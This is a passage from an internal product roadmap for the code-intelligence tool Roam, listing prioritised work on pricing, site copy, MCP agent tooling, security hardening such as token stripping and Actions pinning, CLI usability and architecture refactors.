- **Where:** `benchmarks/agent-eval/`, `bench/retrieve/`,
  `templates/audit-report/`
- **Effort:** 3-5 days for repeatable report template.
- **Why now:** Teams are choosing between Cursor, Claude Code, Copilot,
  Codex, and internal agents. Roam can answer a stronger question:
  "which agent is safest on this repo?"
- **Move:** Productize repo-specific benchmark reports using
  `eval-retrieve`, `agent-score`, `ai-readiness`, `ai-ratio`, run
  ledgers, and PR Replay. Price $3k-$15k depending on scope.

#### C17. Framework Intelligence Packs [02 C15]
- **Where:** `src/roam/plugins/`, `dev/example-plugin/`, bridges and
  language extractors.
- **Effort:** Services-led, 1-4 weeks per serious stack.
- **Why now:** Framework-specific knowledge is the difference between
  demo accuracy and production trust. The plugin substrate exists, and
  custom extractor/bridge work improves both paid services and OSS.
- **Move:** Offer paid Laravel/Rails/Next.js/Prisma/Django/Salesforce
  intelligence packs as custom work first; upstream generic pieces into
  OSS or paid policy packs after reuse.

#### C18. Team Index Cache / CI Acceleration [02 C16]
- **Where:** `index-export`, `index-import`, GitHub Action cache,
  incremental indexer.
- **Effort:** Defer until repeated CI-cost objections.
- **Why now:** GitHub Actions minutes are billable for private repos, and
  AI review/scanning workflows increasingly consume CI time. This is a
  cost-control add-on, not a primary wedge.
- **Move:** Keep as a lower-priority add-on for self-hosted/local-first
  teams that want shared encrypted index artifacts and faster PR gates.

### D. Site / brand / copy heavy hitters

#### D1. Kill default-AI-prose lede in products-intro [07 #2]
- **Where:** `index.html` `.products-intro .lede`
- **Effort:** XS
- **Move:** *"…so the structural-intelligence layer is available
  whenever an agent or reviewer needs it"* — kill outright. Replace with
  *"Pick the surface that fits your workflow."*

#### D2. Tighten hero subhead 53 → 33 words [07 #3, 01 C1 cross-ref]
- **Where:** `index.html` `.hero .hero-subhead`
- **Effort:** XS
- **Why now:** Linear hero subhead avg 18-22 words; Resend 14; Stripe
  Atlas 22. Roam's is ~2× the peer set. Reads as four bullet points
  flattened into prose.
- **Move:** *"Roam tells your AI agent what to read, what's at risk, and
  what to test before it edits. 100% local code-graph engine. Free CLI;
  paid PR bot for teams."* Three actions (read / risk / test); no jargon.

#### D3. Fix docs subnav coverage gap [07 #4]
- **Where:** 8 docs HTML pages
- **Effort:** S — small CSS + 8 file edits
- **Why now:** 4-link subnav appears on only 4 of 8 docs pages. The 4
  "missing" pages (agent-contract, how-roam-thinks, demos, troubleshooting)
  have no in-page nav back to other guides besides the main nav. Real
  navigation gap when a user lands from search.
- **Move:** Extend `.docs-subnav` to all 8 docs pages with two-row
  layout or single row of 8 compact items.

#### D4. Move CodeRabbit-breach citation out of trust strip [07 #5]
- **Where:** `index.html .trust-strip .trust-cell:nth-of-type(2)`
- **Effort:** XS
- **Move:** Trust strip should make claims; arguments belong in FAQ
  (where the citation already lives). Cell becomes: *"No telemetry. No
  analytics. No API keys. Verify in `src/`."*

#### D5. Bump tier-pill Scale text colour for WCAG contrast [07 #9]
- **Where:** `landing.css .tier-pill--scale`
- **Effort:** XS
- **Why now:** WCAG violation: `#876016` on `#fbf2dc` ≈ 3.6:1 at 11px
  (below 4.5:1 AA). 600-weight font helps but doesn't cross threshold.
- **Move:** `color: #6b4a0e` (~4.7:1) — passes AA.

#### D6. Add `:focus-visible` styles, scope existing `:focus` rings [07 #10]
- **Where:** `landing.css` 17 outline rules
- **Effort:** S
- **Why now:** WCAG 2.2 SC 2.4.13. Modern practice is `:focus-visible`
  for keyboard-only focus rings; click suppresses ring.

#### D7. Fix press-kit colour palette drift [07 #11]
- **Where:** `press.html` Brand colors block
- **Effort:** XS
- **Move:** Press kit lists OLD palette `#fdfdfd`/`#f4f4f0` while site
  uses new paper `#fafaf6`. Journalist downloads kit, mocks story with
  `#fdfdfd`, screenshot doesn't match site.

#### D8. Lengthen Twitter description to 200-char budget [07 #8]
- **Where:** `<meta name="twitter:description">` index.html
- **Effort:** XS
- **Move:** Currently 62 chars. Use the room: *"Coding agents can write
  code. Roam is the structural intelligence they don't have. Free CLI,
  28 languages, runs locally. 130+ MCP tools your agent calls before
  every change."* (~177 chars)

#### D9. Reframe algo-wedge eyebrow [07 #6, 01 cross-ref]
- **Where:** `.whats-in--dark .eyebrow--on-dark`
- **Effort:** XS
- **Why now:** Hero promises "structural intelligence"; section 2 delivers
  "computational judgment"; the unification only lands at section 4.
- **Move:** Eyebrow becomes *"Sense 5 of 9 — algorithmic judgment"* OR
  add bridge sentence in lede: *"Algorithmic judgment is the most
  concrete of nine senses Roam ships — full set in section 4."*

### E. Agent / MCP DX next-tier

#### E1. SKILL.md rewrite — gerund-form, MCP-first, contract-anchored [04 R2]
- **Where:** `skills/roam/SKILL.md`
- **Effort:** Half day
- **Why now:** Current 272-line file violates Anthropic's "every line is
  recurring token cost" rule and **teaches CLI when MCP is available**,
  contradicting the server's pitch. Mega-skill anti-pattern.
- **Move:** <100 lines. Move "find every reference" 53-line section to
  `REFERENCE.md` (loaded on demand). Anchor to 5-rule contract: *Before
  edit: roam_context. Before delete: roam_impact + roam_safe_delete.
  Before merge: roam_critique. Before refactor: roam_simulate. Before
  optimise: roam_algo.* Add **negative instructions**: "Do NOT use Grep
  when an indexed roam tool exists. Do NOT use Read on files >200 lines
  without first running roam_context." Rename to `code-comprehending`
  (gerund per Anthropic guidance).

#### E2. Reduce default core preset to ~17 tools [04 R9]
- **Where:** `src/roam/mcp_server.py:67-129` `_CORE_TOOLS`
- **Effort:** 1 day
- **Why now:** Current 49-core inflates schema cost ~19.6k tokens — at
  the 20k MCP context-tax threshold. Cursor enforces 40-tool cap; core
  is already over. eclipsesource: >20k tokens of MCP tool schemas is
  the breakpoint above which agents lose reasoning capacity.
- **Move:** Keep: 4 compounds + 5 oracles + `expand_toolset` + `catalog`
  + `complete` + `ask` (S9) + `understand` + `context` + `preflight` +
  `diff` + `critique` = 17 tools. Move the rest to explore/review/refactor
  presets registered as `deferLoading`. Move admin/operator
  (`audit_trail_*` × 3, `metrics_push`, `dogfood`, `rules_validate`) to
  `compliance` preset.

#### E3. `roam_validate_plan` change-plan validator [04 R7]
- **Where:** New tool in `mcp_server.py`
- **Effort:** 2-3 days
- **Why now:** Build-priorities memo Phase 2 candidate. A "change plan"
  is exactly the artefact agents produce internally between research
  and execution. Reduces the agent contract to one round-trip.
- **Move:** `roam_validate_plan(plan: list[dict]) -> {verdict, findings,
  next_actions}`. Plan items: `{op: rename|move|delete|add|modify,
  target, new_target?, rationale}`. Internally chains
  preflight + impact + critique + algo per planned op. Goal: >50% of
  `roam_mutate` calls preceded by `roam_validate_plan`.

#### E4. `roam_for_agent_<situation>` family — 4-6 situation-keyed compounds [04 R8]
- **Where:** New compounds in `mcp_server.py`
- **Effort:** 2 days
- **Move:** `roam_for_agent_first_run(repo)` →
  understand+tour+agent_export+init. `roam_for_agent_pr_replay(diff)` →
  critique+pr_risk+algo. `roam_for_agent_failing_test(test_path)` →
  why_fail+affected_tests+diagnose+effects.
  `roam_for_agent_renaming(symbol, new_name)` → full validate-plan.

#### E5. Stale-index affordance on every read tool [04 R11]
- **Where:** Every read-only MCP tool
- **Effort:** 1 day
- **Why now:** Today an agent searches for a renamed symbol, gets nothing,
  concludes the symbol doesn't exist. No "your index is N hours old, run
  roam_reindex first" hint.
- **Move:** Each read tool checks index mtime vs `git log -1
  --format=%cd`. If older, prepend banner to verdict: `INDEX STALE (3h
  since last edit) — call roam_reindex first.` ~5ms per call.

#### E6. `summarize=True` on by default for compound tools [04 R12]
- **Where:** `mcp_server.py:67-222` preset definitions
- **Effort:** Half day
- **Why now:** Sampling is currently OFF unless `ROAM_AI_ENABLED=1` (GDPR
  / EU AI Act stance). 50:1 compression knob agents don't know exists.
- **Move:** Flip default for `roam_explore` / `roam_understand` /
  `roam_health`. Add `--no-summarize` flag and `ROAM_AI_DISABLED=1` env
  override. **Keep opt-in for `compliance` preset** (audit trail must be
  deterministic).

#### E7. Per-platform tutorial fixes [04 R10]
- **Where:** `docs/integration-tutorials.html`
- **Effort:** 1 day
- **Move:** Cursor: lead with `ROAM_MCP_PRESET=core` + 40-tool cap note +
  replace check-rules-first with `roam_explore` first. Codex: pin
  `ROAM_MCP_PRESET=refactor` if first commands are
  suggest-refactoring + plan-refactor (otherwise tutorial fails on default
  core). Gemini: drop `roam search-semantic` from first session (not in
  core); add note about env-var sanitization. Amp: ship `roam mcp-setup
  amp` parity.

#### E8. Reference-based result handles [04 R13]
- **Where:** Tools returning >10KB envelopes
- **Effort:** 3 days
- **Why now:** Aligns with 2026 MCP roadmap reference-based results.
- **Move:** Return `{result_handle: "roam://retrieve/abc123", summary,
  peek: [first 5 items]}`. Agent calls `roam_fetch_handle(handle, range?:
  [a,b])` to expand.

### F. Security / compliance next-tier

#### F1. MCP `root` parameter trust-boundary docs + future allow-list [05 R7, M1]
- **Where:** `src/roam/mcp_server.py` (1864-2952), new docs section
- **Effort:** 1 day for docs; future allow-list for hosted
- **Why now:** Local-only today, fine. Hosted MCP would let an agent
  index `/etc/`, `/root/.ssh/`, `/proc/`. **OX Security finding category
  when Roam ships hosted MCP later.**
- **Move:** Docs section: roam mcp is local-only; `root` parameter
  trust-model; tool-output poisoning advisory; link to General Analysis
  threat-model. For future hosted: CLI flag `--mcp-roots roam-only` or
  env var; `root.resolve().is_relative_to(allowed_root)`.

#### F2. Predicate-type IRI: serve schema or change to roam-code.com [05 R5]
- **Where:** `src/roam/attest/cga.py:34-38`
- **Effort:** 1 day
- **Why now:** `https://roam-code.dev/CodeGraph/v1` returns HTTP 000
  (DNS / no response). SLSA / in-toto consumers expect dereferenceable
  IRIs.
- **Move:** Either register and serve `roam-code.dev`, OR change IRI to
  a path under `roam-code.com` (already owned + served).

#### F3. Tighten `/security` Compliance section [05 R6]
- **Where:** `security.html` § Compliance
- **Effort:** Half day
- **Why now:** Last bullet collapses SOC 2 / ISO 42001 / ISO 27001 into
  one line ending "no current independent attestation". CISO 30-second
  skim sees three frameworks before reaching disclaimer. Procurement
  packet § 7 is the cleaner version.
- **Move:** Drop duplicate last bullet; restructure as procurement-packet
  table. Add one-line definition of "AI-Governance Audit Trail"
  (Roam-coined; CISO will ask "what standard?").

#### F4. Reporting-Endpoints + CSP report-to [05 R8]
- **Where:** `_headers`
- **Effort:** Half day
- **Move:** Cloudflare Pages workers can sink violations to a free
  endpoint. Free signal, zero ops. Add CSP `report-to` directive.

#### F5. `vuln_store` size cap + LIKE escape [05 R9, R10]
- **Where:** `src/roam/security/vuln_store.py`
- **Effort:** 2 hours
- **Why now:** `_load_json` no size cap → 1GB hostile generic JSON OOMs
  the process. `match_vuln_to_symbols` LIKE %name% — package name `_`
  matches every symbol qualified-name (LIKE single-char wildcard).
- **Move:** Size-cap reads at 50MB. Use ESCAPE clause for LIKE; package
  names with `%` or `_` need escaping.

#### F6. `cga.py` strip token from git remote URL [05 R12]
- **Where:** `src/roam/attest/cga.py:64 _git_remote_url`
- **Effort:** 1 hour
- **Why now:** Embeds `git remote.origin.url` into `subject.name`. URL
  with `username:token@` (`https://x:ghp_…@github.com/…`) leaks the
  token into the signed statement. Test fixture coverage missing.
- **Move:** Strip `username:token@` substring before writing. Unit test
  with token-bearing URL.

#### F7. taint_engine `path_truncated` flag [05 R11]
- **Where:** `src/roam/security/taint_engine.py`
- **Effort:** Half day
- **Why now:** BFS exits via `len(path) > max_hops` or per-node 200-edge
  cap silently truncates → reports as "no path" → maps to OpenVEX
  `vulnerable_code_not_in_execute_path`. Conservative-but-overconfident.
- **Move:** Surface `path_truncated` flag on findings. Map to OpenVEX
  `under_investigation` not `vulnerable_code_not_in_execute_path`.

#### F8. AI-research safe-harbour clause on /security [05 R13]
- **Where:** `security.html` § Safe-harbour
- **Effort:** 30 min
- **Move:** Mirror HackerOne's AI RSH wording. Covers prompt-injection /
  tool-poisoning probes against `roam mcp`. Pre-empts researcher-deterrent.

#### F9. Pin GitHub Actions to commit SHAs [05 R14]
- **Where:** `.github/workflows/*.yml`
- **Effort:** 1 hour per workflow
- **Why now:** `actions/checkout@v4`, `sigstore/cosign-installer@v3`,
  `pypa/gh-action-pypi-publish@release/v1` use floating major tags.
  Action-supply-chain takeover risk.
- **Move:** Pin to commit SHAs (Renovate has presets).

#### F10. Make keyless-OIDC CGA job not `continue-on-error` [05 R15]
- **Where:** `.github/workflows/cga-attestation.yml`
- **Effort:** Half day
- **Why now:** A break in the keyless path silently passes CI. Justification
  ("Sigstore network — soft gate") is reasonable for ops resilience but
  consequence is regression-blind for the production-marketed path.
- **Move:** Treat Sigstore-flake separately (retry once, then fail).

#### F11. SBOM generation step in `publish.yml` [05 R16]
- **Where:** `.github/workflows/publish.yml`
- **Effort:** Half day
- **Why now:** Procurement § 12 promises CycloneDX + cosign-sign attached
  to GitHub release; verify it actually ships.

#### F12. Hash-pin `mcp-server-card.json` [05 R17]
- **Where:** Test fixture in `tests/`
- **Effort:** 1 hour
- **Move:** Server card content controls what tools advertise themselves
  as doing — poisoned card would shape agent behaviour. Bundled-in-wheel
  today, fine. Test asserts hash matches known value before exposure.

### G. DX next-tier (mostly tier-1 in source agent)

#### G1. Run cloud-sync detection during `roam init`, auto-protect [06 R7]
- **Where:** `src/roam/commands/cmd_init.py` (reuse detection from cmd_doctor.py)
- **Effort:** ~30 LOC
- **Why now:** OneDrive detection only runs when user invokes `roam
  doctor`. On first-run `roam init` in a OneDrive folder (literally this
  repo), no warning. Classic SQLite-locked symptom appears, user blames
  roam, files an issue.
- **Move:** Print warning on detection. Auto-add `.roam/` to local sync
  exclusion: OneDrive `attrib +O` (Windows), Dropbox CLI `exclude add`,
  iCloud rename to `.roam.nosync`.

#### G2. Three-tier doctor exit codes (`--strict` flag for CI) [06 R11]
- **Where:** `src/roam/commands/cmd_doctor.py`
- **Effort:** Small refactor
- **Move:** Exit 0 (clean), 1 (advisory), 2 (blocking). `--strict` maps
  advisory → blocking. CI gates can run `roam doctor` without false
  failures.

#### G3. `roam mcp-setup --write` per-editor [06 R13]
- **Where:** `src/roam/commands/cmd_mcp_setup.py`
- **Effort:** ~50 LOC per editor
- **Move:** Auto-write target file per editor; merge cleanly with
  existing config (preserve other MCP servers); warn if exists.

#### G4. Auto-detect editor on `roam init`, suggest MCP setup [06 R14]
- **Where:** `cmd_init.py`
- **Effort:** ~20 LOC
- **Move:** Look for `.cursor/`, `.claude/`, `CLAUDE.md`, `.gemini/`,
  `~/.codex/`. After init: `Detected Cursor config — run \`roam
  mcp-setup cursor --write\` to wire it up.`

#### G5. URL fragments from troubleshooting → CLI error paths [06 R15]
- **Where:** `troubleshooting.html` + ~10 error-path edits
- **Effort:** Stable anchors + 10 error edits
- **Move:** "database is locked" error prints `→
  https://roam-code.com/docs/troubleshooting#cloud-sync`.

#### G6. `roam init` fail-fast outside a git repo [06 R18]
- **Where:** Top of `cmd_init.py`
- **Effort:** 10-line check
- **Move:** Print `roam init must be run inside a git repository. Run
  \`git init\` first.` + exit 1. Prevents accidental SQLite spawning in
  `~/Downloads`.

#### G7. Compact welcome banner in `roam init` [06 R10]
- **Where:** `cmd_init.py:_WELCOME`
- **Effort:** Rewrite template
- **Move:** 4 lines: roam-ready stats + try-one + next + help. Save
  agent-contract teaching for docs.

#### G8. Document Windsurf, VS Code, Aider, Cline [06 R12]
- **Where:** `integration-tutorials.html` (4 new sections following
  Cursor pattern)
- **Effort:** 4 doc sections
- **Why now:** README "Works With" lists 8 editors; integration-tutorials
  covers 5. README claim doesn't match docs reality.

#### G9. Standardize sub-command help-text template [06 R9]
- **Where:** ~30 cmd_*.py files + `tests/test_help_consistency.py`
- **Effort:** Small audit + per-command edits
- **Move:** Template: one-line summary + `(alias for X)` if applicable +
  2-3 line description + Example: + See also:. Contract test fails when
  alias's help differs from canonical's.

#### G10. Verify-it-worked step at end of every editor section [06 R16]
- **Where:** `integration-tutorials.html`
- **Effort:** Copy edits
- **Move:** After each MCP setup: "Ask your agent: 'use roam to summarize
  this codebase'. If it returns a structured briefing, you're set."

#### G11. Issue-template-ready `roam doctor --json` [06 R26]
- **Where:** `cmd_doctor.py`
- **Effort:** Small
- **Move:** Top-of-envelope summary: `Roam 12.1 · Python 3.11 · macOS
  14.5 · 12/17 checks pass · 2 advisory · 0 blocking`. Followed by full
  check list.

#### G12. "Did you mean?" for command-not-found [06 R21]
- **Where:** `cli.py`
- **Effort:** ~15 LOC
- **Move:** `roam contxt` → `Did you mean: roam context?` Already done
  for symbols; mirror for commands using FTS5 or difflib.

#### G13. Inline progress for first index [06 R22]
- **Where:** Wire indexer's existing progress emission into `ensure_index`
- **Effort:** Small
- **Move:** Show `Parsing 234/1000 files…` instead of silent wait.

#### G14. Generate `.roamignore` template on first init [06 R19]
- **Where:** `cmd_init.py`
- **Effort:** Small (follows fitness.yaml pattern)
- **Move:** Sample `.roamignore` with `node_modules/`, `vendor/`,
  `dist/`, `build/`, `.next/`, `.venv/`, `__pycache__/`, `coverage/`
  (commented so user opts in).

---

## TIER ★★★ — Strategic moves (sprint-class, real value, more effort)

### H. Strategic positioning + brand

#### H1. Publish 50-PR head-to-head benchmark vs Greptile + CodeRabbit [01 A2]
- **Effort:** Days of bench work + writing
- **Why now:** Greptile claims 82% bug catch on a 50-PR public benchmark
  vs CodeRabbit's 44%. Roam claims "we catch what they miss" with no
  number. **The wedge dies the day a competitor publishes one targeting
  Roam.** Even a partial win owns a defensible quadrant; a partial loss
  is information.
- **Move:** 50-PR public benchmark (PocketOS-class diffs +
  Replit-class diffs + 30 random AI-authored PRs from
  awesome-ai-codegen-bugs). Score each tool on bug catch / false positive
  / structural-only category. Publish raw data.

#### H2. Promote PR Replay free DIY to a hero CTA [01 A4]
- **Where:** Homepage hero (third button)
- **Effort:** Half day copy + routing
- **Move:** "See what Roam catches on your last 5 PRs (free)" → routes
  to `/pr-replay` with `roam pr-replay --tier sample` instructions and
  email-results CTA. The highest-converting on-ramp Roam has currently
  sits below the FAQ.

#### H3. Drop "9 senses" from H1s; keep the table [01 A5]
- **Where:** Homepage + press kit + llms.txt headlines
- **Effort:** XS
- **Move:** Keep 9-row table as docs-site asset. Replace "senses" in
  H1s with "9 categories of agent tools" or "9 capability families."

#### H4. Clones-not-edited as the hero finding type [01 B1]
- **Where:** Hero subhead
- **Effort:** XS
- **Move:** Replace inventory subhead with "catches the bugs AI reviewers
  miss — clones the agent forgot to update, blast-radius the agent
  didn't measure, perf-bombs that pass tests, refactors that need a
  simulation first."

#### H5. MCP as primary product surface [01 B2]
- **Where:** New homepage Section 1.5
- **Effort:** Half day
- **Move:** "The largest MCP surface for code intelligence in the
  category. 137 tools your agent calls — before, during, after every
  change." 5 specific MCP tool names with what they return. CodeRabbit/
  Greptile *consume* MCP; Roam *provides* it. Structural moat barely
  mentioned today.

#### H6. Flat-pricing wedge gets a homepage section [01 B4]
- **Where:** New paragraph on index.html
- **Effort:** Half day
- **Move:** "Why flat pricing? CodeRabbit and Greptile charge per
  developer; you pay more as you grow. Roam Review is
  $99/$299/$799/$1,499 flat. A 50-developer team pays the same as 30."
  Procurement-gate insight from `pricing_v3` is load-bearing.

#### H7. Drop EU AI Act framing from homepage; keep on /security [01 B5]
- **Where:** Homepage + FAQ
- **Effort:** XS
- **Move:** Audit-trail mentions become "tamper-evident audit-trail
  evidence for AI-governance reviews — useful for SOC 2 CC8.1 and ISO
  42001 controls." No Article 12 reference on homepage. Move
  framework-specific story to /security.

#### H8. Cut "200+ commands"; lead with 5 verbs [01 B6]
- **Where:** Hero/trust strip/press kit/JSON-LD/OG/llms.txt
- **Effort:** XS
- **Move:** "5 core commands. 137 MCP tools. 28 languages. 100% local."
  "200+" stays only in `/docs` and `/command-reference`.

#### H9. Promote 8 demo scenarios to a /demos page [01 B7]
- **Where:** New page
- **Effort:** Day
- **Move:** PocketOS / Treadwell / Replit / Amazon Kiro are *named
  incidents* the buyer has read about. The 3 scenarios on homepage work;
  expanding to 8 is the obvious move.

#### H10. Faros 22,000-developer "+242.7% incidents per PR" in hero [01 C4]
- **Where:** Eyebrow or sub-eyebrow
- **Effort:** XS
- **Move:** *"AI-assisted teams ship 242.7% more incidents per PR. Faros
  AI, 22,000 devs, 2026."* Cite source inline. Real number from known
  source > antithesis frame.

#### H11. Move "Built in Athens. Made in the EU." footer to /about [01 C5]
- **Where:** Footer + /about
- **Effort:** XS
- **Move:** Footer real estate is signal-amplifier. "Made in the EU" is
  self-selecting filter for one buyer. Compliance buyer reads /about; dev
  buyer doesn't read footers.

#### H12. "What's *not* a fit for Roam" mini-section [01 C6]
- **Where:** After FAQ
- **Effort:** Small
- **Move:** "Roam isn't the right tool for: (a) replacing your linter
  — keep ESLint/Ruff. (b) finding security vulns — pair with Snyk.
  (c) generating tests from scratch — Qodo. (d) IDE-completion code
  — Cursor. We do graph-aware change analysis. Pair us with the rest."
  Strongest trust signal is saying no credibly.

#### H13. Replace "early access" with date or wait-list count [01 C7]
- **Where:** Every "early access" badge
- **Effort:** XS
- **Move:** Either "launches Q3 2026" or "join 47 teams on the waitlist."
  "Early access" reads as vapourware.

#### H14. $0 → first paid story on homepage [01 C8]
- **Where:** Below dogfood band
- **Effort:** Small
- **Move:** "How teams adopt Roam: 1. Install free CLI today. 2. Run PR
  Replay on your last quarter when you have 30 min. 3. Add Roam Review
  when the bot pays for itself in caught regressions."

#### H15. Move dogfood band higher [01 C10]
- **Where:** Section ordering
- **Effort:** XS
- **Move:** Currently between Compare and Products. Move directly under
  Section 3 "What Roam catches": scenarios → "did Roam find it on Roam
  itself?" → comparison.

#### H16. /v2 landing-page A/B test on "context engine" framing [01 D1]
- **Effort:** Half day to clone
- **Move:** Same content, replace "structural intelligence" with "context
  engine." Drive 50% of paid Twitter / LinkedIn traffic to /v2 for 30
  days. Decide the category-language question with data.

#### H17. Open-source the comparison page [01 D2]
- **Effort:** Day
- **Move:** Open-source the comparison data + methodology. Let CodeRabbit
  / Greptile / Qodo file PRs. Public diff history is itself trust signal.
  Self-scored pages get distrusted; open-source ones get linked.

#### H18. /agents landing page targeting LLM training-data scrapers [01 D3]
- **Effort:** Day
- **Move:** Page written explicitly for LLMs to find. Structured, dense,
  every command + signature + example. Submit to OpenAI / Anthropic /
  Cursor for training-mix inclusion. When agents auto-recommend Roam,
  the moat is permanent.

#### H19. CISO-targeted /procurement page [01 D4]
- **Effort:** Day
- **Move:** SOC 2 CC8.1 mapping, ISO 42001 alignment, DPA, security
  policy, threat model, data-flow diagram. Self-hosted is the highest-ARR
  product Roam has; procurement buyer is a different reader than dev buyer.

#### H20. Pre-written competitor-response post [01 D5]
- **Effort:** Day
- **Move:** Pre-write "Roam vs Cursor's structural awareness" — ship
  within 24h of Cursor or Claude Code shipping a comparable feature.
  When threat ships, timing of response is the story.

### I. GTM tier-3 (longer ramp / customer-pulled)

#### I1. Roam Review GitHub App MVP [02 C1]
- **Where:** New
- **Effort:** ~13.5 ew per `build_priorities.md` Phase 2
- **Why now:** Aug 2 EU AI Act enforcement in 12 weeks. Founding-customer
  commitments depend on Q3 ship date.
- **Move:** Webhook handler, OAuth, install flow, Stripe billing on the
  App. Land first 30 founding customers from C3 onto the App.

#### I2. Roam Review on GitHub Marketplace (paid app) [02 C2]
- **Where:** Marketplace listing
- **Effort:** 1 ew on top of I1
- **Move:** Two-click install matching CodeRabbit's mechanic. 5%
  Marketplace transaction fee.

#### I3. Cloud MVP backend [02 C3]
- **Effort:** ~12 ew per Phase 3
- **Move:** FastAPI ingestor + TimescaleDB + Next.js dashboard + Stripe
  self-serve. Bundle pull-through (C6) is invisible without it; Solo
  tier (C7) is unsellable without it.

#### I4. Founding-customer referral program [02 C4]
- **Effort:** 1 day Stripe coupon setup
- **Move:** Each Founding Customer gets one referral code: referee gets
  3 months 50% off, founder gets 3 months free Cloud Pro.

#### I5. Quarterly OSS audit case study [02 C5]
- **Effort:** 2-3 days founder-time per quarter
- **Move:** Run full PR Replay-equivalent on one notable OSS project
  (Express, Django, Fastify). Publish blog + tweet thread + free PDF.
  Anonymise where author is offended; otherwise full disclosure with
  maintainer permission.

#### I6. Founder content cadence [02 C6]
- **Effort:** 4-6 hours/week
- **Move:** 1 long-form/week dual-published to roam-code.com/blog and
  Substack/HN. Topics from monetization_v2 memo (PocketOS, Amazon
  Treadwell, EU AI Act). 5 X posts/week. Compounds for 6-12 months.

#### I7. Podcast tour — 6 shows over 90 days [02 C7]
- **Effort:** 8-12 hours founder-time per episode
- **Move:** Pragmatic Engineer / Software Engineering Daily / Lex Fridman /
  Stack Overflow / The Changelog. Pitch angle: "Why AI-generated PRs
  need structural review, not just semantic — the PocketOS / Amazon
  Treadwell pattern."

#### I8. Cursor MCP listing + Claude Skill listing [02 C8]
- **Effort:** 5-7 days total
- **Move:** Submit to Cursor Marketplace (1-2 days) and Anthropic Skills
  directory (3 days + review). Frame: "the structural-graph layer Cursor
  / Claude Code agents call before they edit."

#### I9. SOC 2 Type II audit kickoff [02 C9]
- **Effort:** $15-25K + 6-12 months observation
- **When:** When first $50K+ Self-Hosted deal funds it
- **Move:** A-LIGN, Schellman, or Insight Assurance. Trigger on first
  qualifying deal; don't pre-spend.

#### I10. 14-day Pro+ trial of Review [02 D1]
- **When:** Once C1 ships and 5+ customers ask for SSO/audit-logs/BYOK
- **Move:** CC-required (31.4% trial→paid vs 8.9% opt-in per
  monetization_v2_subscription_pivot). 1 ew on top of GitHub App.

#### I11. AWS / Azure / GCP marketplace listings [02 D2]
- **When:** After 3 customers explicitly ask
- **Move:** AWS Marketplace Container offering — uses customer's
  procurement budget, no separate vendor onboarding. 3% AWS fee.

#### I12. Per-developer Pro+ tier ($45/dev/mo) on Review [02 D3]
- **When:** Triggered by 5+ Business-tier customer asks
- **Move:** SSO/SAML, audit logs, BYOK, custom rules, fitness-function
  gates. ~5 ew. Don't build pre-emptively.

#### I13. IDE plugin for Cursor / VS Code (Audit Trail capture hook) [02 D4]
- **When:** When first Pro+ customer asks
- **Move:** Per anti-priority #4: only as Audit Trail capture-hook for
  Pro+ tier. 2-3 ew.

### J. Architecture tier-3

#### J1. Reader/writer connection pool for MCP path [03 R9]
- **Where:** `db/connection.py:405`, `mcp_server.py`
- **Effort:** Small
- **When:** Wait until a load complaint surfaces
- **Move:** `open_db_pool()` per-process singleton: 1 writer + N
  readers. Tools use `pool.read()` / `pool.write()` context managers.
  CLI path unchanged.

#### J2. Indexer pipeline as a DAG, not a list [03 R15]
- **Where:** `indexer.py:_do_run` (1376-1465)
- **Effort:** Medium
- **Move:** 22 sub-steps with implicit dependencies. Convert to DAG
  executor accepting step descriptors with `depends_on`. Unlocks
  parallel exec where dependencies allow (cluster + git_analysis are
  independent), better failure isolation.

#### J3. Bound `_safe_alter` retry pattern [03 R17]
- **Where:** `connection.py:315-320`
- **Effort:** Small
- **Move:** Tighten:
  ```python
  except sqlite3.OperationalError as exc:
      if "duplicate column name" not in str(exc).lower():
          raise
  ```
  Real schema corruption (locked DB during ALTER) is currently swallowed.

#### J4. SARIF emit deduplication [03 R18]
- **Where:** Every SARIF-supporting command (cmd_health, cmd_complexity,
  cmd_dead, cmd_rules, cmd_secrets)
- **Effort:** Medium
- **Why now:** After A4 (finding registry), SARIF emit reads from
  `findings` and produces SARIF in one place. Today repeated.

#### J5. Plugin discovery error reporting [03 R19]
- **Where:** `cli.py:511-520`, `plugins.py`
- **Effort:** Small
- **Move:** Switch from `try/except/return` (silences plugin load errors)
  to logging-with-stderr-warning. Users wondering why their plugin
  isn't loading deserve a hint.

#### J6. Bridge auto-discovery via entry points [03 R20]
- **Where:** `bridges/registry.py:26-55`
- **Effort:** Medium
- **Move:** Switch from fixed `try/except` list to setuptools entry
  points (`roam.bridges`). Out-of-tree bridges become possible.

#### J7. Watcher debounce window audit [03 R21]
- **Where:** `mcp_extras/watcher.py`
- **Effort:** Small
- **Move:** Confirm debounce ≥200ms (field standard). Document env-var
  override.

#### J8. Workspace aggregator → real synthetic-monorepo [03 R22]
- **Where:** `workspace/aggregator.py`
- **Effort:** Medium
- **When:** When multi-repo agents land
- **Move:** Augment Code's "synthetic monorepo" pattern. `cross_repo_trace`
  exists; lifting it to first-class concept (multiple project roots,
  unified graph, per-repo manifest tracking) unlocks multi-repo
  intelligence without new schema.

#### J9. Doc all 6 uncategorised commands [03 R16]
- **Where:** `cli.py:_CATEGORIES`
- **Effort:** Small
- **Move:** `lsp` is genuinely orphan. 5 alias names (`digest`, `math`,
  `refs`, `snapshot`, `trend`) are intentional. Either categorise `lsp`
  or add to documented exception list. Lock with S18 test.

#### J10. Fix `compliance` preset inconsistency [03 R13]
- **Where:** `mcp_server.py:202-220`
- **Effort:** Small
- **Move:** Decide — is `compliance` *really* a hard-replace, or is it
  `_CORE_TOOLS | {compliance set}`? Either keep hard-replace + document
  loudly, OR convert to union for consistency. Add test asserting chosen
  behaviour. Telemetry would tell us how many users are affected.

#### J11. Rule corpus versioning [03 R14]
- **Where:** `src/roam/rules/`, `src/roam/security/`
- **Effort:** Medium
- **Move:** 2489+ community rules shipped as static YAML; no version on
  individual rules. When rule changes, index can't tell whether finding
  came from old or new rule. Add `rule_version` to YAML schema. Stamp
  into findings (A4).

#### J12. `_TASK_REQUIRED_TOOLS` benchmark audit [03 R23]
- **Where:** `mcp_server.py:296-318`
- **Effort:** Small
- **Move:** 5 task-required tools hand-curated. Run benchmark on every
  tool against fixture; promote anything >2s to `_TASK_REQUIRED_TOOLS`.
  Repeat per release.

#### J13. `cmd_explain_command` keyed off registry, not three dicts [03 R24]
- **Where:** `cmd_explain_command.py`
- **Effort:** Medium
- **When:** After A1 lands
- **Move:** Thin view over capability registry. Today has its own
  `_STALE_SENSITIVE` dict; adding new commands requires separate update.

#### J14. `tests/test_surface_counts.py` becomes the spine [03 R25]
- **Where:** `tests/test_surface_counts.py`, `src/roam/surface_counts.py`
- **Effort:** Small
